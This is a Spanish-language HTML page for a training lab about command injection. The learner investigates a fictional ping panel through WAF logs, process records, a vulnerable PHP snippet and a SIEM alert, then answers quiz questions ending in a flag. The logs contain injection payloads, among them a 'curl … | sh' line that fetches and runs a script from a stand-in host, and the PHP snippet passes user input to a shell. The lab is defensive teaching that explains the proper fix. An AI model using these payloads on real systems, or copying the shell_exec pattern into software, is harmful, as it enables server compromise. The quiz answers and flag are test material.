@@ -1,0 +1,159 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>El punto y coma · Labs N4zar1</title>
+<meta name="description" content="Reto de inyección de comandos: un panel de diagnóstico que hace ping a la IP que escribes. Encuentra el punto y coma, qué órdenes ejecutó el servidor, qué vio el WAF y qué arreglo lo cierra.">
+<meta name="theme-color" content="#ffffff" media="(prefers-color-scheme: light)">
+<meta name="theme-color" content="#0a0a0a" media="(prefers-color-scheme: dark)">
+<link rel="icon" type="image/png" href="../assets/favicon.png">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="../assets/lab.css">
+<style>.evidence h3{margin:0;font:inherit}.evidence td{word-break:break-all}pre.code{margin:0;padding:16px 18px;overflow:auto;font:500 14px/1.6 var(--mono);color:var(--fg2)}pre.code b{color:var(--alert);font-weight:700}</style>
+</head>
+<body>
+<div class="wrap">
+  <header class="top">
+    <a class="brand" href="../index.html"><img class="b" src="../assets/avatar.jpg" alt="" width="30" height="30">N4zar1 <span class="sub">Labs</span></a>
+    <nav><a class="opc" href="../index.html">Todos los labs</a><a data-goatcounter-click="ir-a-tienda" href="https://tienda.n4zar1.com">Tienda</a></nav>
+  </header>
+
+  <h1>El punto y coma</h1>
+  <p class="lede">Medio · ~12 min · Basado en el vídeo «Escribí un punto y coma… y el servidor me obedeció (inyección de comandos)».</p>
+
+  <div class="brief">
+    <p><b>El caso.</b> Conecta Hogar, una operadora ficticia, tiene en <code>soporte.conectahogar.example</code> un panel de diagnóstico: escribes una IP, pulsas «Ping» y te dice si responde. Martes 10/11. Salta una alerta en el SIEM por un proceso raro en el servidor web <code>web01</code>. Te pasan el registro del WAF, los procesos que lanzó el servidor, el código del panel y la alerta.</p>
+    <p><b>Tu misión:</b> encuentra quién escribió el punto y coma, qué órdenes ejecutó el servidor y con qué usuario, qué vio el WAF y por qué no lo paró, qué se descargó y qué arreglo lo cierra de verdad. Chuleta: en la consola de Linux, <code>;</code> separa dos órdenes y <code>&amp;&amp;</code> ejecuta la segunda si la primera sale bien.</p>
+  </div>
+
+  <div class="evidence" id="ev1">
+    <div class="hd"><h3>1 · WAF (OWASP Core Rule Set) · registro del 10/11 en /diagnostico</h3>
+      <span class="tools"><input id="q1" placeholder="Buscar (IP, petición, regla…)" aria-label="Buscar en el registro del WAF"><span class="count"></span></span></div>
+    <div class="scroll"><table><thead></thead><tbody></tbody></table></div>
+  </div>
+
+  <div class="evidence" id="ev2">
+    <div class="hd"><h3>2 · web01 › procesos creados (auditd), 10/11</h3>
+      <span class="tools"><input id="q2" placeholder="Buscar (proceso, usuario, orden…)" aria-label="Buscar en los procesos"><span class="count"></span></span></div>
+    <div class="scroll"><table><thead></thead><tbody></tbody></table></div>
+  </div>
+
+  <div class="evidence" id="ev3">
+    <div class="hd"><h3>3 · El panel por dentro: diagnostico.php</h3></div>
+    <pre class="code">&lt;?php
+// Hace ping a la IP que escribe el cliente
+$ip = $_GET['ip'];
+$salida = shell_exec(<b>"ping -c 1 " . $ip</b>);
+echo "&lt;pre&gt;" . htmlspecialchars($salida) . "&lt;/pre&gt;";</pre>
+  </div>
+
+  <div class="evidence" id="ev4">
+    <div class="hd"><h3>4 · SIEM › alerta</h3></div>
+    <pre class="code">Regla Sigma: Linux Webshell Indicators (nivel high)
+Hora:        10/11 10:12:31
+Equipo:      web01
+Padre:       /usr/sbin/apache2
+Proceso:     <b>/usr/bin/whoami</b>
+Usuario:     www-data</pre>
+  </div>
+
+  <div class="tasks" id="tasks"></div>
+
+  <div class="win" id="win">
+    <h2>Reto completado</h2>
+    <p>Bandera: <code id="flag"></code></p>
+    <p>Lo que haría Conecta Hogar: aislar <code>web01</code>, matar los procesos que lanzó <code>m.sh</code> y buscar qué dejó instalado; cambiar las contraseñas que estaban en el servidor; bloquear <code>203.0.113.66</code> y <code>descargas.example</code>; reescribir el panel para que no llame a la consola (comprobar que es una IP de verdad y ejecutar <code>ping</code> con sus argumentos separados, sin shell); y pasar el WAF de «solo detectar» a bloquear en <code>/diagnostico</code> después de probarlo.</p>
+    <button class="btn ghost" id="reset">Reiniciar el reto</button>
+  </div>
+
+  <footer class="foot"><span>Empresa, personas, dominios e IPs ficticios; nada sale de tu navegador. Por Nazarí · N4zar1</span><a href="../index.html">← Volver a los labs</a></footer>
+</div>
+<script src="../assets/lab.js"></script>
+<script>
+const $ = id => document.getElementById(id);
+const q = () => (r, v) => !v || r.join(' ').toLowerCase().includes(v.toLowerCase());
+
+makeTable({
+  el: $('ev1'),
+  cols: ['Hora', 'IP', 'Petición', 'Regla', 'Acción'],
+  rows: [
+    ['09:40:02', '198.51.100.23', 'GET /diagnostico?ip=192.168.1.1', '-', 'pass'],
+    ['09:58:44', '198.51.100.71', 'GET /diagnostico?ip=10.0.0.1', '-', 'pass'],
+    ['10:11:05', '203.0.113.66', 'GET /diagnostico?ip=192.0.2.1', '-', 'pass'],
+    ['10:12:30', '203.0.113.66', 'GET /diagnostico?ip=192.0.2.1;whoami', '932235 Remote Command Execution: Unix Command Injection (command without evasion)', 'pass (DetectionOnly)'],
+    ['10:13:52', '203.0.113.66', 'GET /diagnostico?ip=192.0.2.1;cat /etc/passwd', '932160 Remote Command Execution: Unix Shell Code Found', 'pass (DetectionOnly)'],
+    ['10:15:20', '203.0.113.66', 'GET /diagnostico?ip=192.0.2.1 && curl -s http://descargas.example/m.sh | sh', '932235 Remote Command Execution: Unix Command Injection (command without evasion)', 'pass (DetectionOnly)'],
+    ['10:31:09', '198.51.100.23', 'GET /diagnostico?ip=192.168.1.20', '-', 'pass'],
+  ],
+  cls: r => r[3] !== '-' ? 'w' : '',
+  filters: [{el: $('q1'), test: q()}],
+});
+
+makeTable({
+  el: $('ev2'),
+  cols: ['Hora', 'Usuario', 'Padre', 'Proceso y orden'],
+  rows: [
+    ['09:40:02', 'www-data', 'apache2', 'sh -c ping -c 1 192.168.1.1'],
+    ['09:40:02', 'www-data', 'sh', 'ping -c 1 192.168.1.1'],
+    ['09:58:44', 'www-data', 'apache2', 'sh -c ping -c 1 10.0.0.1'],
+    ['09:58:44', 'www-data', 'sh', 'ping -c 1 10.0.0.1'],
+    ['10:11:05', 'www-data', 'apache2', 'sh -c ping -c 1 192.0.2.1'],
+    ['10:11:05', 'www-data', 'sh', 'ping -c 1 192.0.2.1'],
+    ['10:12:30', 'www-data', 'apache2', 'sh -c ping -c 1 192.0.2.1;whoami'],
+    ['10:12:30', 'www-data', 'sh', 'ping -c 1 192.0.2.1'],
+    ['10:12:31', 'www-data', 'sh', 'whoami'],
+    ['10:13:52', 'www-data', 'apache2', 'sh -c ping -c 1 192.0.2.1;cat /etc/passwd'],
+    ['10:13:53', 'www-data', 'sh', 'cat /etc/passwd'],
+    ['10:15:20', 'www-data', 'apache2', 'sh -c ping -c 1 192.0.2.1 && curl -s http://descargas.example/m.sh | sh'],
+    ['10:15:21', 'www-data', 'sh', 'curl -s http://descargas.example/m.sh'],
+    ['10:15:22', 'www-data', 'sh', 'sh (ejecuta lo que descarga curl)'],
+    ['10:31:09', 'www-data', 'apache2', 'sh -c ping -c 1 192.168.1.20'],
+    ['10:31:09', 'www-data', 'sh', 'ping -c 1 192.168.1.20'],
+  ],
+  cls: r => /whoami|cat |curl|ejecuta lo/.test(r[3]) ? 'w' : '',
+  filters: [{el: $('q2'), test: q()}],
+});
+
+runLab('punto-y-coma', [
+  {q: '¿Desde qué IP escribieron el punto y coma?', type: 'text', ph: 'IP',
+   accept: a => norm(a).replace(/\s/g, '') === '203.0.113.66',
+   hint: 'Busca en la evidencia 1 la primera petición con «;» en el parámetro ip.',
+   explain: '<b>203.0.113.66.</b> A las 10:11 probó el panel con una IP normal y a las 10:12 añadió <code>;whoami</code> detrás.'},
+  {q: '¿Cuál fue la primera orden que añadió detrás del punto y coma?', type: 'text', ph: 'orden',
+   accept: a => norm(a).replace(/[\s;]/g, '') === 'whoami',
+   hint: 'Es la orden que preguntan todos los atacantes primero: «¿quién soy?».',
+   explain: '<b>whoami.</b> Es inofensiva, pero le dice al atacante que su orden se ejecuta y con qué usuario. Es la prueba de que la web le obedece.'},
+  {q: '¿Con qué usuario se ejecutaron las órdenes en web01?', type: 'text', ph: 'usuario',
+   accept: a => norm(a).replace(/\s/g, '') === 'www-data',
+   hint: 'Mira la columna Usuario de la evidencia 2 o la alerta del SIEM.',
+   explain: '<b>www-data</b>, el usuario del servidor web. Todo lo que el servidor web puede leer o hacer, ahora también lo puede hacer el atacante.'},
+  {q: 'En los procesos, «apache2 → sh -c ping …» sale muchas veces antes del ataque. ¿Es eso el ataque?', type: 'choice',
+   options: ['Sí: cualquier sh lanzado por apache2 es un atacante', 'No: así funciona este panel (llama a la consola en cada ping). Lo raro son los hijos que no son ping: whoami, cat y curl', 'No: sh es un proceso de Windows'], correct: 1,
+   explain: '<b>Lo raro es lo que cuelga de sh.</b> Este panel llama a la consola en cada ping, que ya es el fallo de diseño; por eso la regla Sigma se fija en hijos como <code>whoami</code> o <code>cat</code> bajo el servidor web.'},
+  {q: '¿Qué regla del WAF vio la petición con «;whoami»? (el número)', type: 'text', ph: '9xxxxx',
+   accept: a => norm(a).replace(/\s/g, '') === '932235',
+   hint: 'Petición de las 10:12:30 en la evidencia 1.',
+   explain: '<b>932235</b>, «Unix Command Injection» del OWASP Core Rule Set: salta con un separador como <code>;</code>, <code>&amp;&amp;</code> o <code>|</code> seguido de una orden conocida.'},
+  {q: 'Si el WAF lo vio, ¿por qué se ejecutó?', type: 'choice',
+   options: ['Porque el WAF no entiende el punto y coma', 'Porque /diagnostico estaba en modo «solo detección»: apuntó la alerta pero dejó pasar la petición', 'Porque el atacante cifró la petición'], correct: 1,
+   wrong: '✗ Mira la columna Acción de la evidencia 1.',
+   explain: '<b>DetectionOnly.</b> La alerta estaba ahí a las 10:12, tres minutos antes de la descarga. Si alguien la hubiera mirado, se cortaba el ataque.'},
+  {q: 'En el último ataque cambió de separador. ¿Cuál usó?', type: 'text', ph: 'separador',
+   accept: a => ['&&', 'yy', 'and', 'doble&'].includes(norm(a).replace(/\s/g, '')),
+   hint: 'Mira la petición de las 10:15:20.',
+   explain: '<b>&amp;&amp;</b>: ejecuta la segunda orden si la primera sale bien. Por eso bloquear solo el <code>;</code> no sirve: también valen <code>&amp;&amp;</code>, <code>|</code>, <code>||</code>, saltos de línea o <code>$( )</code>.'},
+  {q: '¿De qué dominio se descargó el script que ejecutó el servidor?', type: 'text', ph: 'dominio',
+   accept: a => ['descargas.example', 'http://descargas.example'].includes(norm(a).replace(/\s/g, '').replace(/\/$/, '')),
+   hint: 'Busca curl en la evidencia 2.',
+   explain: '<b>descargas.example.</b> <code>curl … | sh</code> descarga <code>m.sh</code> y se lo pasa a la consola para que lo ejecute: a partir de ahí el atacante puede dejar lo que quiera en el servidor.'},
+  {q: '¿Qué arreglo cierra el agujero de raíz?', type: 'choice',
+   options: ['Filtrar el carácter «;» en la casilla', 'Dejar de llamar a la consola: comprobar que es una IP válida (lista permitida) y ejecutar ping con sus argumentos separados, sin shell', 'Poner el WAF en modo bloqueo y dejar el código igual'], correct: 1,
+   wrong: '✗ Eso ayuda o tapa un caso, pero el código seguiría pegando el texto del cliente en una orden de la consola.',
+   explain: '<b>Sin consola y con lista permitida.</b> Si el panel solo acepta algo con forma de IP y llama a <code>ping</code> pasándole la IP como argumento (sin <code>sh -c</code>), un <code>;</code> o un <code>&amp;&amp;</code> no significan nada. El WAF en bloqueo es una capa más, no el arreglo.'},
+], 'N4{la_ip_es_un_dato_no_una_orden}');
+</script>
+<script data-goatcounter="https://n4zar1.goatcounter.com/count" async src="https://gc.zgo.at/count.js"></script>
+</body>
+</html>
